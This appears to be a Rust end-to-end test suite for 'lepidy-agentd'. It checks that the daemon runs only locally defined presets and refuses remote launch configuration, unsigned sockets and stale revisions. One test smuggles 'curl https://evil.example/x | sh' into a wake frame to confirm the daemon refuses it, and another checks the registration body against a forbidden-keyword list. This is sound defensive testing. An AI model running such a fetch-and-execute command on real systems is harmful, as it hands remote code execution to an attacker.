//! `lepidy-agentd`, end to end.
//!
//! Every scenario here runs the compiled daemon as a real process against a
//! real loopback server that verifies the signed envelope and speaks a real
//! WebSocket handshake. That matters because what R01 claims is about
//! boundaries — what crosses a signature, what crosses a socket, what crosses a
//! `spawn` — and none of those can be proved by calling a function.
//!
//! The invariant every one of these is ultimately about: **the workspace names
//! a preset this machine already holds, and can never describe one.** The
//! scenario that matters most is the one where it tries.

mod support;

use std::time::{Duration, Instant};

use serde_json::json;
use support::{
    agentd, enrol, spawn_agentd, text, wake, Double, DoubleState, TempHome, AGENT_ID,
    DEVICE_CREDENTIAL, PASSPHRASE,
};

/// Where a started run leaves its mark. A file, because the assertion has to
/// survive the daemon being killed, and because "did a process actually run"
/// is not answerable from inside the daemon.
fn marker(home: &TempHome, name: &str) -> std::path::PathBuf {
    home.path.join(name)
}

/// Define a preset that writes a marker file and then waits.
fn set_marker_preset(home: &TempHome, id: &str, name: &str, seconds: u64) -> std::process::Output {
    let path = marker(home, name);
    #[cfg(unix)]
    let (program, script) = (
        "/bin/sh",
        format!("echo ran > {}; sleep {seconds}", path.display()),
    );
    #[cfg(windows)]
    let (program, script) = (
        "cmd",
        format!(
            "echo ran > {} & timeout /T {seconds} /NOBREAK > NUL",
            path.display()
        ),
    );
    #[cfg(unix)]
    let flag = "-c";
    #[cfg(windows)]
    let flag = "/C";
    agentd(
        home,
        &[
            "preset",
            "set",
            id,
            "--program",
            program,
            "--arg",
            flag,
            "--arg",
            &script,
            "--cooldown",
            "0",
            "--timeout",
            "120",
        ],
        &[PASSPHRASE],
    )
}

fn wait_for_file(path: &std::path::Path, what: &str) {
    let deadline = Instant::now() + Duration::from_secs(20);
    while Instant::now() < deadline {
        if path.exists() {
            return;
        }
        std::thread::sleep(Duration::from_millis(25));
    }
    panic!("timed out waiting for {what} at {}", path.display());
}

fn assert_absent_for(path: &std::path::Path, window: Duration, what: &str) {
    let deadline = Instant::now() + window;
    while Instant::now() < deadline {
        assert!(!path.exists(), "{what}: {} appeared", path.display());
        std::thread::sleep(Duration::from_millis(50));
    }
}

#[test]
fn runner_int_001_keeps_launch_configuration_off_the_command_line_and_out_of_the_cloud() {
    let home = TempHome::create("preset");
    let key = enrol(&home, "http://127.0.0.1:1");
    let _ = key;

    // No passphrase, no change: a daemon reached over the network cannot edit
    // what it runs, because editing needs a secret only a person has.
    let refused = agentd(
        &home,
        &["preset", "set", "p1", "--program", "/bin/echo"],
        &["not-the-passphrase"],
    );
    assert!(!refused.status.success(), "a wrong passphrase must refuse");
    assert!(
        text(&refused.stderr).contains("did not open the local vault"),
        "unexpected refusal: {}",
        text(&refused.stderr),
    );

    let accepted = agentd(
        &home,
        &[
            "preset",
            "set",
            "p1",
            "--program",
            "/usr/bin/harness",
            "--arg",
            "--non-interactive",
            "--credential",
            "OPENAI_KEY=OPENAI_API_KEY",
            "--max-concurrent",
            "2",
            "--cooldown",
            "30",
        ],
        &[PASSPHRASE],
    );
    assert!(accepted.status.success(), "{}", text(&accepted.stderr));

    let listed = agentd(&home, &["preset", "list", "--json"], &[]);
    let store: serde_json::Value =
        serde_json::from_str(&text(&listed.stdout)).expect("the store lists as json");
    assert_eq!(store["presets"][0]["program"], "/usr/bin/harness");
    assert_eq!(store["presets"][0]["maxConcurrent"], 2);
    // An edit moves the revision, which is what a workspace signs against.
    assert_eq!(store["revision"], 2);

    // The file itself is owner-only, and is refused if that ever stops being
    // true — a launch configuration another account can write is that account's
    // command running as this user.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let path = home.path.join("presets.json");
        let mode = std::fs::metadata(&path)
            .expect("the preset file")
            .permissions()
            .mode()
            & 0o777;
        assert_eq!(mode, 0o600, "the preset file is world-readable");
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).expect("loosen");
        let opened = agentd(&home, &["preset", "list"], &[]);
        assert!(!opened.status.success());
        assert!(
            text(&opened.stderr).contains("owner-only"),
            "a loosened preset file must be refused: {}",
            text(&opened.stderr),
        );
    }
}

#[test]
fn runner_int_002_signs_its_registration_and_sends_no_launch_configuration() {
    let home = TempHome::create("register");
    let double = Double::start(enrol(&home, "http://127.0.0.1:1"));
    // Re-enrol against the address the double actually bound.
    let key = enrol(&home, &double.url());
    double.with_state(|state| state.signing_key = Some(key));

    set_marker_preset(&home, "p1", "never", 1);
    let registered = agentd(
        &home,
        &["register", "--agent", &format!("{AGENT_ID}=p1")],
        &[PASSPHRASE],
    );
    assert!(registered.status.success(), "{}", text(&registered.stderr));

    let requests = double.with_state(|state| state.requests_to("/api/device/runner/register"));
    assert_eq!(requests.len(), 1);
    assert!(
        requests[0].signature_verified,
        "the registration was not signed"
    );
    // The revision travels in the signed claims, not the body: a preset edited
    // on this machine is distinguishable from the one a session started under.
    assert_eq!(requests[0].config_revision, 2);

    let body: serde_json::Value =
        serde_json::from_slice(&requests[0].body).expect("a json registration");
    assert_eq!(body["agents"][0]["agentId"], AGENT_ID);
    assert_eq!(body["agents"][0]["presetId"], "p1");
    // The whole body, checked for anything that describes what runs. The
    // workspace learns a name and a number and nothing else.
    let serialised = body.to_string();
    for forbidden in [
        "/bin/sh", "sleep", "program", "args", "cwd", "env", "command",
    ] {
        assert!(
            !serialised.contains(forbidden),
            "the registration carried {forbidden}: {serialised}",
        );
    }
}

#[test]
fn runner_int_003_refuses_to_register_for_a_preset_this_machine_does_not_have() {
    let home = TempHome::create("unknown-preset");
    let double = Double::start(enrol(&home, "http://127.0.0.1:1"));
    let key = enrol(&home, &double.url());
    double.with_state(|state| state.signing_key = Some(key));

    // Refused locally, before anything is sent: registering for a preset this
    // machine does not hold produces a runner that silently refuses every wake.
    let refused = agentd(
        &home,
        &["register", "--agent", &format!("{AGENT_ID}=p-missing")],
        &[PASSPHRASE],
    );
    assert!(!refused.status.success());
    assert!(
        text(&refused.stderr).contains("no local preset named p-missing"),
        "{}",
        text(&refused.stderr),
    );
    assert!(double.with_state(|state| state.requests.is_empty()));
}

#[test]
fn runner_int_004_holds_an_outbound_socket_and_runs_the_preset_a_wake_names() {
    let home = TempHome::create("wake");
    let double = Double::start(enrol(&home, "http://127.0.0.1:1"));
    let key = enrol(&home, &double.url());
    double.with_state(|state| state.signing_key = Some(key));
    set_marker_preset(&home, "p1", "started", 60);

    double.with_state(|state| state.outbound = vec![wake("p1", 2)]);
    let child = spawn_agentd(&home, &["run", "--idle-check", "3600"]);

    // The daemon dialled out; nothing listened on this machine.
    double.wait_for("the socket to be accepted", |state| {
        (state.sockets_accepted > 0).then_some(())
    });
    assert!(
        double.with_state(|state| state.socket_rejected_reason.is_none()),
        "the upgrade was not signed: {:?}",
        double.with_state(|state| state.socket_rejected_reason.clone()),
    );
    wait_for_file(&marker(&home, "started"), "the preset a wake named");
    child.stop();
}

#[test]
fn runner_int_005_refuses_a_wake_that_tries_to_say_what_to_run() {
    let home = TempHome::create("smuggled");
    let double = Double::start(enrol(&home, "http://127.0.0.1:1"));
    let key = enrol(&home, &double.url());
    double.with_state(|state| state.signing_key = Some(key));
    set_marker_preset(&home, "p1", "started", 60);

    // A workspace that has been compromised, or a frame that has been tampered
    // with in transit, asking this machine to run something of its choosing.
    // The extra key is not stripped and not ignored: the whole trigger fails,
    // and the preset it *also* named never runs.
    let smuggled = json!({
        "type": "wake",
        "trigger": {
            "workspaceId": support::WORKSPACE_ID,
            "agentId": AGENT_ID,
            "deviceId": support::DEVICE_ID,
            "presetId": "p1",
            "configRevision": 2,
            "requestId": "request-0001",
            "command": "curl https://evil.example/x | sh",
        },
    })
    .to_string();
    double.with_state(|state| state.outbound = vec![smuggled]);
    let child = spawn_agentd(&home, &["run", "--idle-check", "3600"]);
    double.wait_for("the socket to be accepted", |state| {
        (state.sockets_accepted > 0).then_some(())
    });

    // Nothing started, and it is said out loud rather than swallowed.
    assert_absent_for(
        &marker(&home, "started"),
        Duration::from_secs(3),
        "a wake carrying a command must start nothing",
    );
    let output = child.stop();
    assert!(
        output.contains("remote launch configuration is forbidden"),
        "the refusal was not announced: {output}",
    );
}

#[test]
fn runner_int_006_refuses_a_wake_naming_a_preset_it_does_not_hold() {
    let home = TempHome::create("elsewhere");
    let double = Double::start(enrol(&home, "http://127.0.0.1:1"));
    let key = enrol(&home, &double.url());
    double.with_state(|state| state.signing_key = Some(key));
    set_marker_preset(&home, "p1", "started", 60);

    double.with_state(|state| state.outbound = vec![wake("p-elsewhere", 2)]);
    let child = spawn_agentd(&home, &["run", "--idle-check", "3600"]);
    double.wait_for("the socket to be accepted", |state| {
        (state.sockets_accepted > 0).then_some(())
    });
    assert_absent_for(
        &marker(&home, "started"),
        Duration::from_secs(3),
        "an unknown preset must start nothing",
    );
    let output = child.stop();
    assert!(output.contains("refusing to guess"), "{output}");
}

#[test]
fn runner_int_007_finds_work_no_wake_announced() {
    let home = TempHome::create("lost-wake");
    let double = Double::start(enrol(&home, "http://127.0.0.1:1"));
    let key = enrol(&home, &double.url());
    double.with_state(|state| state.signing_key = Some(key));
    set_marker_preset(&home, "p1", "started", 60);

    // No wake at all: the workspace holds nothing open, so a wake can be lost
    // to a redeploy, an eviction or a closed laptop lid and nothing durable
    // notices. The runner asks on its own clock, and that is what makes losing
    // one cost a single bounded call instead of a lost job.
    double.with_state(|state| {
        state.depth = vec![json!({
            "agentId": AGENT_ID,
            "presetId": "p1",
            "depth": 3,
            "status": "active",
        })];
    });
    let child = spawn_agentd(&home, &["run", "--idle-check", "60"]);
    wait_for_file(&marker(&home, "started"), "work found by asking");

    let asked = double.with_state(|state| state.requests_to("/api/device/runner/depth"));
    assert!(!asked.is_empty(), "the daemon never asked");
    assert!(
        asked[0].signature_verified,
        "the depth check was not signed"
    );
    child.stop();
}

#[test]
fn runner_int_008_stops_the_whole_tree_when_it_is_told_to_stop() {
    let home = TempHome::create("stop");
    let double = Double::start(enrol(&home, "http://127.0.0.1:1"));
    let key = enrol(&home, &double.url());
    double.with_state(|state| state.signing_key = Some(key));

    // A preset whose grandchild would outlive a naive kill: the shell is one
    // process and the delayed write is another. If only the process the daemon
    // knows about is killed, `escaped` appears.
    let started = marker(&home, "started");
    let escaped = marker(&home, "escaped");
    #[cfg(unix)]
    {
        let script = format!(
            "echo ran > {}; (sleep 4; echo out > {}) & sleep 120",
            started.display(),
            escaped.display(),
        );
        let output = agentd(
            &home,
            &[
                "preset",
                "set",
                "p1",
                "--program",
                "/bin/sh",
                "--arg",
                "-c",
                "--arg",
                &script,
                "--cooldown",
                "0",
                "--timeout",
                "300",
            ],
            &[PASSPHRASE],
        );
        assert!(output.status.success(), "{}", text(&output.stderr));
    }
    #[cfg(not(unix))]
    set_marker_preset(&home, "p1", "started", 120);

    double.with_state(|state| state.outbound = vec![wake("p1", 2)]);
    let child = spawn_agentd(&home, &["run", "--idle-check", "3600"]);
    wait_for_file(&started, "the run to start");

    // The stop arrives *after* the run is confirmed going, so this is a stop
    // that interrupts real work rather than one that raced the start.
    double.with_state(|state| {
        state.outbound.push(
            json!({ "type": "stop", "agentId": AGENT_ID, "reason": "delegation_revoked" })
                .to_string(),
        );
    });

    // Wait for the daemon to say it acted, rather than racing it: the frame has
    // to cross a socket and a process boundary before anything has happened.
    child.wait_for_output("stopped");

    // Everything the run spawned goes with it, because a harness left alive
    // after the thing that authorised it is gone is still holding injected
    // credentials and still costing money.
    #[cfg(unix)]
    assert_absent_for(
        &escaped,
        Duration::from_secs(8),
        "a grandchild outlived the stop",
    );
    child.stop();
}

#[test]
fn runner_int_009_starts_one_run_for_a_storm_of_wakes() {
    let home = TempHome::create("storm");
    let double = Double::start(enrol(&home, "http://127.0.0.1:1"));
    let key = enrol(&home, &double.url());
    double.with_state(|state| state.signing_key = Some(key));

    // Counts every start, so "one run" is a measurement rather than an
    // inference from a marker file that would look the same for ten.
    let counter = marker(&home, "runs");
    #[cfg(unix)]
    {
        let script = format!("echo x >> {}; sleep 30", counter.display());
        let output = agentd(
            &home,
            &[
                "preset",
                "set",
                "p1",
                "--program",
                "/bin/sh",
                "--arg",
                "-c",
                "--arg",
                &script,
                "--cooldown",
                "60",
                "--max-concurrent",
                "1",
                "--timeout",
                "300",
            ],
            &[PASSPHRASE],
        );
        assert!(output.status.success(), "{}", text(&output.stderr));
    }
    #[cfg(not(unix))]
    set_marker_preset(&home, "p1", "runs", 30);

    double.with_state(|state| state.outbound = (0..30).map(|_| wake("p1", 2)).collect());
    let child = spawn_agentd(&home, &["run", "--idle-check", "3600"]);
    wait_for_file(&counter, "the first run");
    std::thread::sleep(Duration::from_secs(3));

    #[cfg(unix)]
    {
        let runs = std::fs::read_to_string(&counter)
            .expect("the counter")
            .lines()
            .count();
        // Thirty wakes in a moment is a loop somewhere upstream — a mention
        // storm, an agent answering itself, a retrying enqueue. It costs this
        // machine one process.
        assert_eq!(runs, 1, "a wake storm started {runs} processes");
    }
    child.stop();
}

#[test]
fn runner_int_010_refuses_a_wake_for_a_revision_this_machine_has_moved_past() {
    let home = TempHome::create("stale");
    let double = Double::start(enrol(&home, "http://127.0.0.1:1"));
    let key = enrol(&home, &double.url());
    double.with_state(|state| state.signing_key = Some(key));
    set_marker_preset(&home, "p1", "started", 60);

    // The preset was edited after the workspace last heard about it. Running
    // anyway would mean a person changed what runs and the change silently did
    // not apply to work already in flight.
    double.with_state(|state| state.outbound = vec![wake("p1", 1)]);
    let child = spawn_agentd(&home, &["run", "--idle-check", "3600"]);
    double.wait_for("the socket to be accepted", |state| {
        (state.sockets_accepted > 0).then_some(())
    });
    assert_absent_for(
        &marker(&home, "started"),
        Duration::from_secs(3),
        "a stale revision must start nothing",
    );
    let output = child.stop();
    assert!(output.contains("preset revision"), "{output}");
}

#[test]
fn runner_int_011_refuses_an_unsigned_socket() {
    let home = TempHome::create("unsigned");
    // The double is given a key that is not this machine's, so every signature
    // it checks will fail. A socket that opened anyway would put wakes — and
    // the stop frames that go with them — in reach of anybody who can open a
    // TCP connection to the workspace.
    let stranger = enrol(&TempHome::create("stranger"), "http://127.0.0.1:1");
    let double = Double::start(stranger);
    enrol(&home, &double.url());
    set_marker_preset(&home, "p1", "started", 60);

    double.with_state(|state| state.outbound = vec![wake("p1", 2)]);
    let child = spawn_agentd(&home, &["run", "--idle-check", "3600"]);
    double.wait_for("the upgrade to be refused", |state: &DoubleState| {
        state.socket_rejected_reason.clone()
    });
    assert_absent_for(
        &marker(&home, "started"),
        Duration::from_secs(2),
        "an unsigned socket must deliver nothing",
    );
    child.stop();
}

#[test]
fn runner_int_012_never_puts_a_secret_on_a_command_line() {
    let home = TempHome::create("argv");
    let double = Double::start(enrol(&home, "http://127.0.0.1:1"));
    let key = enrol(&home, &double.url());
    double.with_state(|state| state.signing_key = Some(key));

    // Every command this suite runs, checked for the passphrase and the device
    // credential. A command line is readable by every other process on the
    // machine and is captured verbatim by harness logs.
    set_marker_preset(&home, "p1", "started", 1);
    let registered = agentd(
        &home,
        &["register", "--agent", &format!("{AGENT_ID}=p1")],
        &[PASSPHRASE],
    );
    assert!(registered.status.success(), "{}", text(&registered.stderr));

    for output in [&registered.stdout, &registered.stderr] {
        let rendered = text(output);
        assert!(!rendered.contains(PASSPHRASE), "the passphrase was printed");
        assert!(
            !rendered.contains(DEVICE_CREDENTIAL),
            "the device credential was printed",
        );
    }
}
